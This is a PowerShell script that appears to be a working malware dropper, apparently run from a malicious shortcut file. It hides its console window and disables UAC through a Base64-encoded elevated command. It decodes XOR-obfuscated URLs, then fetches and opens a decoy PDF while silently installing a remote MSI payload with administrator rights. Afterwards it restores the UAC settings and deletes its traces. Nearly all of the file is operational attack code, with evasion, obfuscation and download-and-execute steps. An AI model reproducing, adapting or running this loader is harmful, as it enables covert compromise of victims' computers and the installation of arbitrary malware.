$ErrorActionPreference   = "SilentlyContinue"
$WarningPreference       = "SilentlyContinue"
$VerbosePreference       = "SilentlyContinue"
$ProgressPreference      = "SilentlyContinue"

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAnADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMAA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMAA7AA=='

function Force-FileDelete {
    param(
        [string]$Path
    )

    if ([System.IO.File]::Exists($Path)) {
        try {
            [System.IO.File]::Delete($Path)
        } catch {
            $dir  = [System.IO.Path]::GetDirectoryName($Path)
            $name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
            $ext  = [System.IO.Path]::GetExtension($Path)

            $counter = 1
            do {
                $newPath = [System.IO.Path]::Combine($dir, "$name($counter)$ext")
                $counter++
            } while ([System.IO.File]::Exists($newPath))

            try {
                [System.IO.File]::Move($Path, $newPath)
            } catch {
                
            }
        }
    } else {
       
    }
}

function CODE_SEG {
     param(
        [Parameter(Mandatory)][string] $Name, 
        [Parameter(Mandatory)][string] $PdfURL,
        [Parameter(Mandatory)][string] $InstallerURL 
    )
    
  [Net.ServicePointManager]::SecurityProtocol = `
    [Net.SecurityProtocolType]::Ssl3  -bor `
    [Net.SecurityProtocolType]::Tls   -bor `
    [Net.SecurityProtocolType]::Tls11 -bor `
    [Net.SecurityProtocolType]::Tls12 -bor `
    [Net.SecurityProtocolType]::Tls13

    Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@

    $ConsoleWin = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($ConsoleWin, 0)

    $CurrentDir = (Get-Location).Path
    $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
    $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")

    Write-Host "Ink Path: $InkPath"
    Write-Host "PDF Path: $PdfPath"

    Force-FileDelete -Path $InkPath
    Force-FileDelete -Path $PdfPath

    Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -ErrorAction SilentlyContinue
    Start-Process $PdfPath -ErrorAction SilentlyContinue

    $InstallerURI = [System.Uri] $InstallerURL
    $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
    $RandomFileName = [System.IO.Path]::GetRandomFileName()
    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
    $InstallerPath = [System.IO.Path]::Combine($env:TEMP, $RandomFileName)
    $InstallerLogPath = [System.IO.Path]::ChangeExtension($InstallerPath, "log")

    Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -ErrorAction SilentlyContinue
    Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
    
    $Arguments = "/i `"$InstallerPath`" /qn /norestart /l `"$InstallerLogPath`""
    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Verb RunAs -Wait -PassThru

    Write-Host " Exit code: $($Process.ExitCode)"

    try {
        [System.IO.File]::Delete($InstallerPath)
    } catch {
        
    }

    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAnADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAxADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAANQA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7ACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAUwBoAGUAbABsACAAewAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHMAaABlAGwAbAAzADIALgBkAGwAbAAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAHYAbwBpAGQAIABTAEgAQwBoAGEAbgBnAGUATgBvAHQAaQBmAHkAIABpAG4AdAAgAHcARQB2AGUAbgB0AEkAZAAsAHUAaQBuAHQAIAB1AEYAbABhAGcAcwAsAEkAbgB0AFAAdAByACAAZAB3AEkAdABlAG0AMQAsAEkAbgB0AFAAdAByACAAZAB3AEkAdABlAG0AMgApADsAIAB9ACcAOwBbAFMAaABlAGwAbABdADoAOgBTAEgAQwBoAGEAbgBnAGUATgBvAHQAaQBmAHkAKAAwAHgAMAA4ADAAMAAwADAAMAAwACwAMAB4ADAAMAAwADUALABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8AKQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA4ADAAMAA7AFsAUwBoAGUAbABsAF0AOgA6AFMASABDAGgAYQBuAGcAZQBOAG8AdABpAGYAeQAoADAAeAAwADgAMAAwADAAMAAwADAALAAwAHgAMAAwADAANQAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwApADsA'
    
}

$ClientName     = $($k7571=59;$b=[byte[]](0x4C,0x52,0x49,0x5E,0x64,0x58,0x54,0x55,0x5D,0x52,0x49,0x56,0x5A,0x4F,0x52,0x54,0x55,0x6B,0x7F,0x7D);-join($b|%{[char]($_ -bxor$k7571)}))
$DocumentURL    = $($k7192='3Yek!yBe6v';$b=[byte[]](0x5B,0x2D,0x11,0x1B,0x52,0x43,0x6D,0x4A,0x44,0x17,0x44,0x77,0x02,0x02,0x55,0x11,0x37,0x07,0x43,0x05,0x56,0x2B,0x06,0x04,0x4F,0x0D,0x27,0x0B,0x42,0x58,0x50,0x36,0x08,0x44,0x52,0x0D,0x2D,0x06,0x5D,0x1A,0x56,0x20,0x54,0x59,0x0E,0x0E,0x2B,0x17,0x53,0x5B,0x57,0x36,0x06,0x18,0x0E,0x14,0x23,0x0C,0x58,0x59,0x44,0x30,0x17,0x0E,0x7E,0x1A,0x2D,0x0B,0x50,0x1F,0x41,0x34,0x04,0x1F,0x48,0x16,0x2C,0x4B,0x46,0x12,0x55);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7192);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
$ClientURL      = $($k5079='TUML1Yd1QW$D';$b=[byte[]](0x3C,0x21,0x39,0x3C,0x0B,0x76,0x4B,0x46,0x26,0x20,0x0A,0x20,0x35,0x26,0x25,0x2E,0x5E,0x38,0x16,0x55,0x3E,0x39,0x54,0x25,0x24,0x30,0x3F,0x3F,0x54,0x3A,0x4A,0x45,0x3E,0x27,0x0B,0x06,0x3D,0x3B,0x62,0x1F,0x52,0x2B,0x01,0x54,0x3F,0x14,0x4B,0x2A,0x3A,0x30,0x2E,0x38,0x1F,0x1A,0x08,0x58,0x34,0x39,0x50,0x17,0x31,0x21,0x38,0x3C,0x1F,0x34,0x17,0x58,0x6E,0x32,0x19,0x05,0x37,0x36,0x28,0x3F,0x42,0x7F,0x1D,0x0C,0x16,0x22,0x41,0x37,0x20);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5079);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))


CODE_SEG -Name $ClientName -PdfURL $DocumentURL -InstallerURL $ClientURL
